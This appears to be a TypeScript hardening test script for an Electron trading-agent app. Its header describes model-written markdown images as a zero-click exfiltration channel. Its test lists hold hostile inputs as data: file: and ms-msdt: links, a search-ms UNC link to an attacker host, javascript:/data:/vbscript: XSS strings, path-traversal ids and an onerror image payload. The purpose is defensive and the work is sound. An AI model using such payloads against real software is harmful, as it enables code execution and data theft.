/**
 * The window shows only the app, nothing in agent prose fetches by itself, and
 * nothing reaches the operating system's shell unchecked.
 *
 * Agents read untrusted text (web pages, headlines, filings, tool results), and
 * what they write is rendered in a window whose preload bridge can arm live
 * trading. So these properties are pinned together:
 *
 *   1. CSP — no remote images (a model-written `![](https://host/?d=<book>)`
 *      would otherwise be a zero-click exfiltration channel), no plugins, no
 *      `<base>`, no form posts, scripts only from the app.
 *   2. Markdown — an image in agent prose renders as its alt text, never as
 *      an `<img>`.
 *   3. `safeExternalUrl` — only absolute http(s)/mailto URLs leave the app;
 *      `file:`, `ms-msdt:`, UNC and scheme-less links never reach the shell.
 *   4. Every `shell.openExternal` in the main process goes through
 *      `openExternalSafely`, and the window refuses navigation away from the
 *      app (the bridge would follow the main frame).
 *   5. The OAuth loopback pages escape what they reflect and forbid scripts.
 *   6. Store ids — an id that is not what `newId` mints never names a folder.
 *   7. The main process's own writes — `agents:update` takes an allowlist,
 *      arming reads the real connection status, secrets are written
 *      atomically, and quitting stops the local model server.
 *
 * Run: `npm run check -- renderer-hardening`
 */
import { readFileSync } from 'node:fs'
import { join, resolve } from 'node:path'
import type { ServerResponse } from 'node:http'
import { isSameAppDocument, safeExternalUrl } from '@shared/externalUrl'
import { isStoredId, newId } from '@shared/agents'
import { escapeHtml, sendLoopbackPage } from '../../src/main/lib/loopbackPage'

let failures = 0
const check = (name: string, ok: boolean, detail = ''): void => {
  if (!ok) failures++
  console.log(`${ok ? 'ok  ' : 'FAIL'}  ${name}${detail ? ` — ${detail}` : ''}`)
}
const ROOT = resolve(import.meta.dirname, '..', '..')
const src = (...p: string[]): string => readFileSync(join(ROOT, ...p), 'utf8').replace(/\r\n/g, '\n')

// ── 1. CSP ─────────────────────────────────────────────────────────────────
const html = src('src', 'renderer', 'index.html')
const csp = /http-equiv="Content-Security-Policy"\s+content="([^"]+)"/.exec(html)?.[1] ?? ''
const directive = (name: string): string => csp.split(';').map((d) => d.trim()).find((d) => d.startsWith(`${name} `)) ?? ''
check('the renderer declares a CSP', csp.length > 0)
check('img-src allows no remote origin', directive('img-src') !== '' && !/https?:|\*/.test(directive('img-src')), directive('img-src'))
check('connect-src stays on the app', directive('connect-src') === "connect-src 'self'", directive('connect-src'))
check("script-src is 'self' only", directive('script-src') === "script-src 'self'", directive('script-src'))
check("object-src 'none', base-uri 'none', form-action 'none'", directive('object-src') === "object-src 'none'" && directive('base-uri') === "base-uri 'none'" && directive('form-action') === "form-action 'none'")

// ── 2. Markdown ────────────────────────────────────────────────────────────
const md = src('src', 'renderer', 'src', 'components', 'common', 'Markdown.tsx')
const imgOverride = /img:\s*\(\{[^}]*\}\)\s*=>\s*\(([\s\S]*?)\),\n/.exec(md)?.[1] ?? ''
check('Markdown overrides img', imgOverride.length > 0)
check('…and the override renders no <img>', imgOverride.length > 0 && !/<img/i.test(imgOverride))
check('no component renders raw HTML', !/rehype-raw|dangerouslySetInnerHTML|skipHtml=\{false\}/.test(md))

// ── 3. safeExternalUrl ─────────────────────────────────────────────────────
for (const ok of ['https://www.sec.gov/cgi-bin/browse-edgar?action=getcompany', 'http://example.com/a', 'mailto:someone@example.com']) {
  check(`opens ${ok}`, safeExternalUrl(ok) !== null)
}
for (const bad of [
  'file:///C:/Windows/System32/calc.exe',
  'ms-msdt:/id PCWDiagnostic',
  'search-ms:query=x&crumb=location:\\\\attacker\\share',
  'javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  '//attacker.example/share/x',
  '\\\\attacker.example\\share\\x',
  'C:\\Windows\\System32\\calc.exe',
  'relative/path',
  'https://',
  '',
  'x'.repeat(5000)
]) {
  check(`refuses ${JSON.stringify(bad.slice(0, 48))}`, safeExternalUrl(bad) === null)
}
check('refuses a non-string', safeExternalUrl({ toString: () => 'https://example.com' }) === null && safeExternalUrl(undefined) === null)

// ── 4. the shell and the window ────────────────────────────────────────────
const mainFiles = ['index.ts', 'ipc/register.ts', 'robinhood/connect.ts', 'chatgpt/oauth.ts', 'chatgpt/auth.ts']
for (const f of mainFiles) {
  const text = src('src', 'main', ...f.split('/'))
  check(`${f}: no direct shell.openExternal`, !/shell\.openExternal\(/.test(text))
}
check('openExternalSafely is the one place that calls shell.openExternal', /safeExternalUrl\(url\)[\s\S]*shell\.openExternal\(safe\)/.test(src('src', 'main', 'lib', 'openExternal.ts')))
const index = src('src', 'main', 'index.ts')
const guards = /app\.on\('web-contents-created', \(_e, contents\) => \{([\s\S]*?)\n\}\)/.exec(index)?.[1] ?? ''
check('the guards apply to every web contents', guards.length > 0)
check('…navigation away from the app is refused', /contents\.on\('will-navigate', \(e, url\) => \{\s*if \(!isSameAppDocument\(url, contents\.getURL\(\)\)\) e\.preventDefault\(\)/.test(guards))
check('…new windows are denied and routed through the check', /contents\.setWindowOpenHandler\(\(d\) => \{\s*void openExternalSafely\(d\.url\)\s*return \{ action: 'deny' \}/.test(guards))
check('…webviews cannot be attached', /contents\.on\('will-attach-webview', \(e\) => e\.preventDefault\(\)\)/.test(guards))
const appFile = 'file:///C:/Program%20Files/Robinhood%20Trading%20Agents/resources/app.asar/out/renderer/index.html'
check('a reload of the packaged page is the same document', isSameAppDocument(appFile, appFile) && isSameAppDocument(`${appFile}#x`, appFile))
check('another local file is not', !isSameAppDocument('file:///C:/Windows/System32/x.html', appFile))
check('a remote page is not', !isSameAppDocument('https://attacker.example/', appFile) && !isSameAppDocument('https://attacker.example/', 'http://localhost:5173/'))
check('the dev server reloading itself is', isSameAppDocument('http://localhost:5173/?t=1', 'http://localhost:5173/'))
check('a different port is a different origin', !isSameAppDocument('http://localhost:8905/', 'http://localhost:5173/'))
check('an unparseable URL is not', !isSameAppDocument('not a url', appFile))
check('context isolation stays on', /contextIsolation: true/.test(index))

// ── 5. loopback pages ──────────────────────────────────────────────────────
const sent: { status?: number; headers: Record<string, string>; body?: string } = { headers: {} }
const fakeRes = {
  set statusCode(v: number) {
    sent.status = v
  },
  setHeader(k: string, v: string) {
    sent.headers[k.toLowerCase()] = v
  },
  end(b: string) {
    sent.body = b
  }
} as unknown as ServerResponse
sendLoopbackPage(fakeRes, 400, 'Sign-in failed', '<img src=x onerror=alert(1)>"\'&')
check('a reflected value is escaped', sent.body !== undefined && !sent.body.includes('<img src=x') && sent.body.includes('&lt;img src=x onerror=alert(1)&gt;&quot;&#39;&amp;'), sent.body?.slice(-120))
check('the page forbids scripts', /default-src 'none'/.test(sent.headers['content-security-policy'] ?? '') && !/script-src/.test(sent.headers['content-security-policy'] ?? ''))
check('it is served as HTML with nosniff', (sent.headers['content-type'] ?? '').startsWith('text/html') && sent.headers['x-content-type-options'] === 'nosniff' && sent.status === 400)
check('escapeHtml covers the five characters', escapeHtml(`&<>"'`) === '&amp;&lt;&gt;&quot;&#39;')
for (const f of ['robinhood/connect.ts', 'chatgpt/oauth.ts']) {
  const text = src('src', 'main', ...f.split('/'))
  check(`${f}: every page goes through sendLoopbackPage`, !/res\.end\(\s*(html|page)\(/.test(text) && /sendLoopbackPage\(res, /.test(text))
}

// ── 6. store ids ───────────────────────────────────────────────────────────
check('every id newId mints is storable', Array.from({ length: 200 }, (_, i) => newId(['ag_', 'm_', ''][i % 3])).every(isStoredId))
for (const bad of ['..', '../x', '..\\x', 'a/b', 'a\\b', 'C:', '', ' ag_1', 'ag_1\n', 'x'.repeat(81)]) {
  check(`refuses id ${JSON.stringify(bad.slice(0, 20))}`, !isStoredId(bad))
}
for (const f of [['store', 'agentStore.ts']]) {
  const text = src('src', 'main', ...f)
  const direct = (text.match(/join\(root\(\), /g) ?? []).length
  check(`${f.join('/')}: ids reach the disk only through pathOf`, direct === 1 && /if \(!isStoredId\(id\)\) throw/.test(text), `${direct} direct join(root(), …)`)
  check(`${f.join('/')}: listing skips folders that are not ids`, /isDirectory\(\) && isStoredId\(d\.name\)/.test(text))
}

// ── 7. the main process's own writes ──────────────────────────────────────
const register = src('src', 'main', 'ipc', 'register.ts')
const fields = /const UPDATABLE_FIELDS = \[([^\]]*)\]/.exec(register)?.[1] ?? ''
check('agents:update takes an allowlist of fields', fields.length > 0 && /updatableFields\(raw\)/.test(register))
check('…which never includes liveArmedAt or the id', !/'liveArmedAt'|'id'|'createdAt'/.test(fields), fields)
check('…and a provider move is refused there (it goes through setProvider)', /patch\.model\.vendor !== cur\.model\.vendor\) throw/.test(register))
check('arming live reads the same connection status the UI does', /armBlockedReason\(rhCreds\.status\(\)\)/.test(src('src', 'main', 'engine', 'Engine.ts')))
const secretStores = [['main', 'store', 'openrouterKey.ts'], ['main', 'store', 'alpacaKey.ts'], ['main', 'store', 'mcpKeys.ts'], ['main', 'claude', 'tokenStore.ts'], ['main', 'chatgpt', 'oauth.ts'], ['main', 'robinhood', 'credStore.ts']]
for (const f of secretStores) {
  const text = src('src', ...f)
  check(`${f.slice(1).join('/')}: secrets go through secureFile (atomic), never writeFileSync`, !/writeFileSync/.test(text) && /from '\.\.\/lib\/secureFile'/.test(text))
}
check('secureFile writes through writeFileAtomic', /writeFileAtomic\(path, encryptString\(plain\)\)/.test(src('src', 'main', 'lib', 'secureFile.ts')))
check('quit stops the llama-server this app started, bounded', /before-quit'[\s\S]*?localEngine\.close\(\)[\s\S]*?setTimeout\(resolve, 5_000\)/.test(index))

console.log(failures ? `\n${failures} FAILED` : '\nall passed')
process.exit(failures ? 1 : 0)
